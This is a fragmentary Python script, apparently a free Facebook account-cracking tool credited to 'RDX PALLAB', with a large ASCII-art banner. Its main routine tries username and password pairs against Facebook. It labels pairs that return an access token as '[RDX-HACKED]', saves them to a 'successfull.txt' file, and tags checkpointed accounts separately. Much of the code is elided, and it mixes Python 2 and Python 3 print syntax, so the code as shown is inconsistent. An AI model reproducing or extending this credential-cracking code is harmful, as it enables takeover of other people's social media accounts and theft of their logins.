...
R::::::RRRRRR:::::R             d::::::d                    
RR:::::R     R:::::R            d:::::d                     
  R::::R     R:::::R    ddddddddd:::::d xxxxxxx      xxxxxxx
  R::::R     R:::::R  dd::::::::::::::d  x:::::x    x:::::x 
  R::::RRRRRR:::::R  d::::::::::::::::d   x:::::x  x:::::x  
  R:::::::::::::RR  d:::::::ddddd:::::d    x:::::xx:::::x   
  R::::RRRRRR:::::R d::::::d    d:::::d     x::::::::::x    
  R::::R     R:::::Rd:::::d     d:::::d      x::::::::x     
  R::::R     R:::::Rd:::::d     d:::::d      x::::::::x     
  R::::R     R:::::Rd:::::d     d:::::d     x::::::::::x    
RR:::::R     R:::::Rd::::::ddddd::::::dd   x:::::xx:::::x   
R::::::R     R:::::R d:::::::::::::::::d  x:::::x  x:::::x  
R::::::R     R:::::R  d:::::::::ddd::::d x:::::x    x:::::x 
RRRRRRRR     RRRRRRR   ddddddddd   dddddxxxxxxx      xxxxxxx
...
print("\033[0;91mThis Tool's Free By RDX PALLB")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : RDX PALLAB'
    print '\033[0;94mFACEBOOK : RDXPALLAB007'
    print '\033[0;96mGITHUB   : RDX20'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RDX-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[PALLAB-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
